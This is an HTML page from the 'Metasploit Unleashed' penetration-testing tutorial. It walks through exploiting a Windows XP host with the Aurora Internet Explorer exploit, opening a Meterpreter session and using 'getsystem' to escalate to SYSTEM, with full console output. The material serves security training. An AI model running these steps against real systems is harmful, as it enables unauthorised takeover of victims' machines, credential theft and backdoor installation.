<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Metasploit Privilege Escalation</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Metasploit
Privilege Escalation</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Frequently, especially with client-side
exploits, you will find that
your session only has limited user rights. This can severely limit
actions you can perform on the remote system such as dumping passwords,
manipulating the registry, installing backdoors, etc. Fortunately,
Metasploit has a Meterpreter script, 'getsystem', that will use a
number of different techniques to attempt to gain SYSTEM level
privileges on the remote system.
</p>
<p style="color: rgb(0, 0, 0);">Using the infamous 'Aurora' exploit, we
see that our Meterpreter session is only running as a regular user
account.
<br>
<br>
</p>
<pre id="code">msf exploit(ms10_002_aurora) &gt;<br>[*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161<br>[*] Sending stage (748544 bytes) to 192.168.1.161<br>[*] Meterpreter session 3 opened (192.168.1.71:38699 -&gt; 192.168.1.161:4444) at 2010-08-21 13:39:10 -0600<br><br>msf exploit(ms10_002_aurora) &gt; sessions -i 3<br>[*] Starting interaction with 3...<br><br><u>meterpreter</u> &gt; getuid<br>Server username: XEN-XP-SP2-BARE\victim<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">To make use of the 'getsystem'
command, we first need to load the 'priv' extension. Running getsystem
with the </span><b style="color: rgb(0, 0, 0);">"-h"</b><span
 style="color: rgb(0, 0, 0);"> switch will display the options
available to us.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; use priv<br>Loading extension priv...success.<br><u>meterpreter</u> &gt; getsystem -h<br>Usage: getsystem [options]<br><br>Attempt to elevate your privilege to that of local system.<br><br>OPTIONS:<br><br>    -h        Help Banner.<br>    -t   The technique to use. (Default to '0').<br>                0 : All techniques available<br>                1 : Service - Named Pipe Impersonation (In Memory/Admin)<br>                2 : Service - Named Pipe Impersonation (Dropper/Admin)<br>                3 : Service - Token Duplication (In Memory/Admin)<br>                4 : Exploit - KiTrap0D (In Memory/User)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will let Metasploit do the heavy
lifting for us and run
getsystem without any options. The script will attempt every method
available to it, stopping when it succeeds. Within the blink of an eye,
our session is now running with SYSTEM privileges.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; getsystem<br>...got system (via technique 4).<br><u>meterpreter</u> &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
